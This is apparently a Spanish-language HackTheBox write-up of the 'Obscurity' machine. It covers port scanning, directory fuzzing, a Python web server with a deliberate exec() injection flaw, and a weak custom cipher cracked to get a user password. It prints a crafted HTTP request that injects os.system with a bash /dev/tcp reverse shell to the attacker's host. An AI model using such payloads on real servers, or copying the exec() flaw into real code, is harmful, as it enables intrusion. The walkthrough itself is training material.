---
layout: post
title: "Obscurity"
subtitle: 'HackTheBox - Medium Machine - Linux'
date: 2020-03-13 12:00:00
author: "TheusZero"
header-img: "images/post/Obscurity.png"
catalog: true
comments: true
multilingual: true
tags:
  - Linux
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

# Obscurity

## Enumeracion

#### NMAP

```vim
┌─[zero@parrot]─[~/HTB/Machines/Obscurity]
└──╼ $nmap -sC -sV 10.10.10.168 -o nmap.txt
# Nmap 7.80 scan initiated Sat Mar 14 13:13:23 2020 as: nmap -sC -sV -o nmap.txt 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.22s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 14 Mar 2020 17:15:47
|     Server: BadHTTPServer
|     Last-Modified: Sat, 14 Mar 2020 17:15:47
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/14%Time=5E6D10C6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sat,\x2014\x20Mar\x2020
SF:20\x2017:15:47\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sat,\x2014\
SF:x20Mar\x202020\x2017:15:47\nContent-Length:\x204171\nContent-Type:\x20t
SF:ext/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"
SF:en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\
SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<
SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
SF:cale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20na
SF:me=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templ
SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20st
SF:ylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boo
SF:tstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-a
SF:wesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templa
SF:temo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target
SF:=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<
SF:div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner
SF:-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20
SF:Sat,\x2014\x20Mar\x202020\x2017:15:47\nServer:\x20BadHTTPServer\nLast-M
SF:odified:\x20Sat,\x2014\x20Mar\x202020\x2017:15:47\nContent-Length:\x204
SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t
SF:<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20co
SF:ntent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conte
SF:nt=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nE
SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
SF:file\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"
SF:scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20
SF:section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"s
SF:k-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 14 13:14:02 2020 -- 1 IP address (1 host up) scanned in 39.61 seconds
```

El nmap nos muestra  2 posibles rutas, aunque por primera revise altiro el puerto 8080 ya que este es un html

#### Web

la web es simple, es importante leerla ya que nos da informacion de un suspuesto archivo.py que maneja el servidor.

> SuperSecureServer.py

Este se encuentra en un directorio secetro, asi que es hora de fuzzear el directorio :D

> ┌─[zero@parrot]─[~/HTB/Machines/Obscurity]
  └──╼ $wfuzz --hh=14 -c  -w /usr/share/dirb/wordlists/big.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
>> 000006016:   200        170 L    498 W    5892 Ch     "develop"

ya tenemos el archivo.py, que lleva esto como code:

```vim
    import socket
    import threading
    from datetime import datetime
    import sys
    import os
    import mimetypes
    import urllib.parse
    import subprocess
    
    respTemplate = """HTTP/1.1 {statusNum} {statusCode}
    Date: {dateSent}
    Server: {server}
    Last-Modified: {modified}
    Content-Length: {length}
    Content-Type: {contentType}
    Connection: {connectionType}
    
    {body}
    """
    DOC_ROOT = "DocRoot"
    ```
    CODES = {"200": "OK", 
            "304": "NOT MODIFIED",
            "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
            "500": "INTERNAL SERVER ERROR"}
    
    MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
            "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
            "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}
    
    
    class Response:
        def __init__(self, **kwargs):
            self.__dict__.update(kwargs)
            now = datetime.now()
            self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
        def stringResponse(self):
            return respTemplate.format(**self.__dict__)
    
    class Request:
        def __init__(self, request):
            self.good = True
            try:
                request = self.parseRequest(request)
                self.method = request["method"]
                self.doc = request["doc"]
                self.vers = request["vers"]
                self.header = request["header"]
                self.body = request["body"]
            except:
                self.good = False
    
        def parseRequest(self, request):        
            req = request.strip("\r").split("\n")
            method,doc,vers = req[0].split(" ")
            header = req[1:-3]
            body = req[-1]
            headerDict = {}
            for param in header:
                pos = param.find(": ")
                key, val = param[:pos], param[pos+2:]
                headerDict.update({key: val})
            return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}
    
    
    class Server:
        def __init__(self, host, port):    
            self.host = host
            self.port = port
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
    
        def listen(self):
            self.sock.listen(5)
            while True:
                client, address = self.sock.accept()
                client.settimeout(60)
                threading.Thread(target = self.listenToClient,args = (client,address)).start()
    
        def listenToClient(self, client, address):
            size = 1024
            while True:
                try:
                    data = client.recv(size)
                    if data:
                        # Set the response to echo back the recieved data 
                        req = Request(data.decode())
                        self.handleRequest(req, client, address)
                        client.shutdown()
                        client.close()
                    else:
                        raise error('Client disconnected')
                except:
                    client.close()
                    return False
        
        def handleRequest(self, request, conn, address):
            if request.good:
    #            try:
                    # print(str(request.method) + " " + str(request.doc), end=' ')
                    # print("from {0}".format(address[0]))
    #            except Exception as e:
    #                print(e)
                document = self.serveDoc(request.doc, DOC_ROOT)
                statusNum=document["status"]
            else:
                document = self.serveDoc("/errors/400.html", DOC_ROOT)
                statusNum="400"
            body = document["body"]
            
            statusCode=CODES[statusNum]
            dateSent = ""
            server = "BadHTTPServer"
            modified = ""
            length = len(body)
            contentType = document["mime"] # Try and identify MIME type from string
            connectionType = "Closed"
    
    
            resp = Response(
            statusNum=statusNum, statusCode=statusCode, 
            dateSent = dateSent, server = server, 
            modified = modified, length = length, 
            contentType = contentType, connectionType = connectionType, 
            body = body
            )
    
            data = resp.stringResponse()
            if not data:
                return -1
            conn.send(data.encode())
            return 0
    
        def serveDoc(self, path, docRoot):
            path = urllib.parse.unquote(path)
            try:
                info = "output = 'Document: {}'" # Keep the output for later debug
                exec(info.format(path)) # This is how you do string formatting, right?
                cwd = os.path.dirname(os.path.realpath(__file__))
                docRoot = os.path.join(cwd, docRoot)
                if path == "/":
                    path = "/index.html"
                requested = os.path.join(docRoot, path[1:])
                if os.path.isfile(requested):
                    mime = mimetypes.guess_type(requested)
                    mime = (mime if mime[0] != None else "text/html")
                    mime = MIMES[requested.split(".")[-1]]
                    try:
                        with open(requested, "r") as f:
                            data = f.read()
                    except:
                        with open(requested, "rb") as f:
                            data = f.read()
                    status = "200"
                else:
                    errorPage = os.path.join(docRoot, "errors", "404.html")
                    mime = "text/html"
                    with open(errorPage, "r") as f:
                        data = f.read().format(path)
                    status = "404"
            except Exception as e:
                print(e)
                errorPage = os.path.join(docRoot, "errors", "500.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read()
                status = "500"
            return {"body": data, "mime": mime, "status": status}
```

el archivo me costo entenderlo, pero luego de un poco de ayuda logre cachar que esto explica que para el index.html se le pueden ingresar string que el sistema ejecuta como python, logrando asi introducir una reverse shell para entrar al system.

meti la pag a un burp, luego hice la reverse shell.

> nc -lvp 4443

```vim
GET /';os.system('bash%20-c%20"bash%20-i%20>&%20/dev/tcp/10.10.14.72/4443%200>&1"');a=' HTTP/1.1
Host: 10.10.10.168:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

listo, entre como www-data

## Robert

este paso culiao me costo muxo, tuve que leer el codigo y entender que hacia cada cosa.

> SuperSecureCrypt.py​ - Este es un acrhivo.py que se usa para encriptar algun archivo o string que le envien
>
> check.txt​ - limpia el texto encryptado de un archivo out.txt que deja el .py anterior
> 
> out.txt​ - texto excriptado del clear text "check.txt"
>
> passwordreminder.txt​ - password encriptada del usuario robert

Una mega paja wn. el tema es que puedes obtener la clave que usa para encriptar de la sgte manera.

> python3 SuperSecureCrypt.py -d -k "Encrypting this file with your
  key should result in out.txt, make sure your key is correct!" -i
  out.txt -o /tmp/passwd.txt
>
> cat /tmp/passwd.txt
>> alexandrovich
>
Ahora con esto podemos obtener lo demas:

> python3 SuperSecureCrypt.py -d -k alexandrovich -i
  passwordreminder.txt -o /tmp/robertpwd.txt
>
>> cat /tmp/robertpwd.txt
>>> SecThruObsFTW

El root es simple, le damos a un 

> sudo -l
 
y obtenemos un archivo que podemos usar como root, este archivo busca usuarios ingresados con priviliegos en el sistema.
y nos pide las credenciales dle mismo, como "robert" es un usuario le di esas credenciales y me dejo usar:

> sudo -u root cat /root/root.txt

listowo :D